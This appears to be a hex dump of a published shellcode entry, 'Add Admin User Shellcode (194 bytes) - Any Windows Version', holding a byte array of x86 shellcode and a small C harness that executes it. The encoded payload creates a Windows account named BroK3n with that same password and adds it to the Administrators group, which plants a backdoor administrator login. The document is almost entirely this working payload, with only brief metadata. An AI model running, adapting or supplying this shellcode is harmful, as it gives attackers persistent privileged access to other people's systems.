00000000  41 64 64 20 41 64 6d 69  6e 20 55 73 65 72 20 53  |Add Admin User S|
00000010  68 65 6c 6c 63 6f 64 65  20 28 31 39 34 20 62 79  |hellcode (194 by|
00000020  74 65 73 29 20 2d 20 41  6e 79 20 57 69 6e 64 6f  |tes) - Any Windo|
00000030  77 73 20 56 65 72 73 69  6f 6e 0a 3d 3d 3d 3d 3d  |ws Version.=====|
00000040  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000070  3d 3d 3d 0a 0a 54 69 74  6c 65 3a 20 20 20 20 20  |===..Title:     |
00000080  20 20 20 20 20 41 64 64  20 41 64 6d 69 6e 20 55  |     Add Admin U|
00000090  73 65 72 20 53 68 65 6c  6c 63 6f 64 65 20 28 31  |ser Shellcode (1|
000000a0  39 34 20 62 79 74 65 73  29 20 2d 20 41 6e 79 20  |94 bytes) - Any |
000000b0  57 69 6e 64 6f 77 73 20  56 65 72 73 69 6f 6e 0a  |Windows Version.|
000000c0  52 65 6c 65 61 73 65 20  64 61 74 65 3a 20 20 20  |Release date:   |
000000d0  32 31 2f 30 36 2f 32 30  31 34 0a 41 75 74 68 6f  |21/06/2014.Autho|
000000e0  72 3a 20 20 20 20 20 20  20 20 20 47 69 75 73 65  |r:         Giuse|
000000f0  70 70 65 20 44 27 41 6d  6f 72 65 20 28 68 74 74  |ppe D'Amore (htt|
00000100  70 3a 2f 2f 69 74 2e 6c  69 6e 6b 65 64 69 6e 2e  |p://it.linkedin.|
00000110  63 6f 6d 2f 70 75 62 2f  67 69 75 73 65 70 70 65  |com/pub/giuseppe|
00000120  2d 64 2d 61 6d 6f 72 65  2f 36 39 2f 33 37 2f 36  |-d-amore/69/37/6|
00000130  36 62 29 0a 53 69 7a 65  3a 20 20 20 20 20 20 20  |6b).Size:       |
00000140  20 20 20 20 31 39 34 20  62 79 74 65 20 28 4e 55  |    194 byte (NU|
00000150  4c 4c 20 66 72 65 65 29  0a 54 65 73 74 65 64 20  |LL free).Tested |
00000160  6f 6e 3a 20 20 20 20 20  20 57 69 6e 38 2c 57 69  |on:      Win8,Wi|
00000170  6e 37 2c 57 69 6e 56 69  73 74 61 2c 57 69 6e 58  |n7,WinVista,WinX|
00000180  50 2c 57 69 6e 32 6b 50  72 6f 2c 57 69 6e 32 6b  |P,Win2kPro,Win2k|
00000190  38 2c 57 69 6e 32 6b 38  52 32 2c 57 69 6e 32 6b  |8,Win2k8R2,Win2k|
000001a0  33 0a 55 73 65 72 6e 61  6d 65 3a 20 20 20 20 20  |3.Username:     |
000001b0  20 20 42 72 6f 4b 33 6e  0a 50 61 73 73 77 6f 72  |  BroK3n.Passwor|
000001c0  64 3a 20 20 20 20 20 20  20 42 72 6f 4b 33 6e 0a  |d:       BroK3n.|
000001d0  0a 63 68 61 72 20 73 68  65 6c 6c 63 6f 64 65 5b  |.char shellcode[|
000001e0  5d 20 3d 20 22 5c 78 33  31 5c 78 64 32 5c 78 62  |] = "\x31\xd2\xb|
000001f0  32 5c 78 33 30 5c 78 36  34 5c 78 38 62 5c 78 31  |2\x30\x64\x8b\x1|
00000200  32 5c 78 38 62 5c 78 35  32 5c 78 30 63 5c 78 38  |2\x8b\x52\x0c\x8|
00000210  62 5c 78 35 32 5c 78 31  63 5c 78 38 62 5c 78 34  |b\x52\x1c\x8b\x4|
00000220  32 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |2".             |
00000230  20 20 20 20 20 20 22 5c  78 30 38 5c 78 38 62 5c  |      "\x08\x8b\|
00000240  78 37 32 5c 78 32 30 5c  78 38 62 5c 78 31 32 5c  |x72\x20\x8b\x12\|
00000250  78 38 30 5c 78 37 65 5c  78 30 63 5c 78 33 33 5c  |x80\x7e\x0c\x33\|
00000260  78 37 35 5c 78 66 32 5c  78 38 39 5c 78 63 37 5c  |x75\xf2\x89\xc7\|
00000270  78 30 33 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x03".           |
00000280  20 20 20 20 20 20 20 20  22 5c 78 37 38 5c 78 33  |        "\x78\x3|
00000290  63 5c 78 38 62 5c 78 35  37 5c 78 37 38 5c 78 30  |c\x8b\x57\x78\x0|
000002a0  31 5c 78 63 32 5c 78 38  62 5c 78 37 61 5c 78 32  |1\xc2\x8b\x7a\x2|
000002b0  30 5c 78 30 31 5c 78 63  37 5c 78 33 31 5c 78 65  |0\x01\xc7\x31\xe|
000002c0  64 5c 78 38 62 22 0a 20  20 20 20 20 20 20 20 20  |d\x8b".         |
000002d0  20 20 20 20 20 20 20 20  20 20 22 5c 78 33 34 5c  |          "\x34\|
000002e0  78 61 66 5c 78 30 31 5c  78 63 36 5c 78 34 35 5c  |xaf\x01\xc6\x45\|
000002f0  78 38 31 5c 78 33 65 5c  78 35 37 5c 78 36 39 5c  |x81\x3e\x57\x69\|
00000300  78 36 65 5c 78 34 35 5c  78 37 35 5c 78 66 32 5c  |x6e\x45\x75\xf2\|
00000310  78 38 62 5c 78 37 61 22  0a 20 20 20 20 20 20 20  |x8b\x7a".       |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 32  |            "\x2|
00000330  34 5c 78 30 31 5c 78 63  37 5c 78 36 36 5c 78 38  |4\x01\xc7\x66\x8|
00000340  62 5c 78 32 63 5c 78 36  66 5c 78 38 62 5c 78 37  |b\x2c\x6f\x8b\x7|
00000350  61 5c 78 31 63 5c 78 30  31 5c 78 63 37 5c 78 38  |a\x1c\x01\xc7\x8|
00000360  62 5c 78 37 63 5c 78 61  66 22 0a 20 20 20 20 20  |b\x7c\xaf".     |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
00000380  78 66 63 5c 78 30 31 5c  78 63 37 5c 78 36 38 5c  |xfc\x01\xc7\x68\|
00000390  78 34 62 5c 78 33 33 5c  78 36 65 5c 78 30 31 5c  |x4b\x33\x6e\x01\|
000003a0  78 36 38 5c 78 32 30 5c  78 34 32 5c 78 37 32 5c  |x68\x20\x42\x72\|
000003b0  78 36 66 5c 78 36 38 5c  78 32 66 22 0a 20 20 20  |x6f\x68\x2f".   |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003d0  22 5c 78 34 31 5c 78 34  34 5c 78 34 34 5c 78 36  |"\x41\x44\x44\x6|
000003e0  38 5c 78 36 66 5c 78 37  32 5c 78 37 33 5c 78 32  |8\x6f\x72\x73\x2|
000003f0  30 5c 78 36 38 5c 78 37  34 5c 78 37 32 5c 78 36  |0\x68\x74\x72\x6|
00000400  31 5c 78 37 34 5c 78 36  38 5c 78 36 39 22 0a 20  |1\x74\x68\x69". |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000420  20 20 22 5c 78 36 65 5c  78 36 39 5c 78 37 33 5c  |  "\x6e\x69\x73\|
00000430  78 36 38 5c 78 32 30 5c  78 34 31 5c 78 36 34 5c  |x68\x20\x41\x64\|
00000440  78 36 64 5c 78 36 38 5c  78 37 32 5c 78 36 66 5c  |x6d\x68\x72\x6f\|
00000450  78 37 35 5c 78 37 30 5c  78 36 38 5c 78 36 33 22  |x75\x70\x68\x63"|
00000460  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000470  20 20 20 20 22 5c 78 36  31 5c 78 36 63 5c 78 36  |    "\x61\x6c\x6|
00000480  37 5c 78 36 38 5c 78 37  34 5c 78 32 30 5c 78 36  |7\x68\x74\x20\x6|
00000490  63 5c 78 36 66 5c 78 36  38 5c 78 32 36 5c 78 32  |c\x6f\x68\x26\x2|
000004a0  30 5c 78 36 65 5c 78 36  35 5c 78 36 38 5c 78 34  |0\x6e\x65\x68\x4|
000004b0  34 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |4".             |
000004c0  20 20 20 20 20 20 22 5c  78 34 34 5c 78 32 30 5c  |      "\x44\x20\|
000004d0  78 32 36 5c 78 36 38 5c  78 36 65 5c 78 32 30 5c  |x26\x68\x6e\x20\|
000004e0  78 32 66 5c 78 34 31 5c  78 36 38 5c 78 37 32 5c  |x2f\x41\x68\x72\|
000004f0  78 36 66 5c 78 34 62 5c  78 33 33 5c 78 36 38 5c  |x6f\x4b\x33\x68\|
00000500  78 33 33 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x33".           |
00000510  20 20 20 20 20 20 20 20  22 5c 78 36 65 5c 78 32  |        "\x6e\x2|
00000520  30 5c 78 34 32 5c 78 36  38 5c 78 34 32 5c 78 37  |0\x42\x68\x42\x7|
00000530  32 5c 78 36 66 5c 78 34  62 5c 78 36 38 5c 78 37  |2\x6f\x4b\x68\x7|
00000540  33 5c 78 36 35 5c 78 37  32 5c 78 32 30 5c 78 36  |3\x65\x72\x20\x6|
00000550  38 5c 78 36 35 22 0a 20  20 20 20 20 20 20 20 20  |8\x65".         |
00000560  20 20 20 20 20 20 20 20  20 20 22 5c 78 37 34 5c  |          "\x74\|
00000570  78 32 30 5c 78 37 35 5c  78 36 38 5c 78 32 66 5c  |x20\x75\x68\x2f\|
00000580  78 36 33 5c 78 32 30 5c  78 36 65 5c 78 36 38 5c  |x63\x20\x6e\x68\|
00000590  78 36 35 5c 78 37 38 5c  78 36 35 5c 78 32 30 5c  |x65\x78\x65\x20\|
000005a0  78 36 38 5c 78 36 33 22  0a 20 20 20 20 20 20 20  |x68\x63".       |
000005b0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
000005c0  64 5c 78 36 34 5c 78 32  65 5c 78 38 39 5c 78 65  |d\x64\x2e\x89\xe|
000005d0  35 5c 78 66 65 5c 78 34  64 5c 78 35 33 5c 78 33  |5\xfe\x4d\x53\x3|
000005e0  31 5c 78 63 30 5c 78 35  30 5c 78 35 35 5c 78 66  |1\xc0\x50\x55\xf|
000005f0  66 5c 78 64 37 22 3b 0a  0a 0a 69 6e 74 20 6d 61  |f\xd7";...int ma|
00000600  69 6e 28 69 6e 74 20 61  72 67 63 2c 20 63 68 61  |in(int argc, cha|
00000610  72 20 2a 2a 61 72 67 76  29 7b 69 6e 74 20 28 2a  |r **argv){int (*|
00000620  66 29 28 29 3b 66 20 3d  20 28 69 6e 74 20 28 2a  |f)();f = (int (*|
00000630  29 28 29 29 73 68 65 6c  6c 63 6f 64 65 3b 28 69  |)())shellcode;(i|
00000640  6e 74 29 28 2a 66 29 28  29 3b 7d                 |nt)(*f)();}|
0000064b
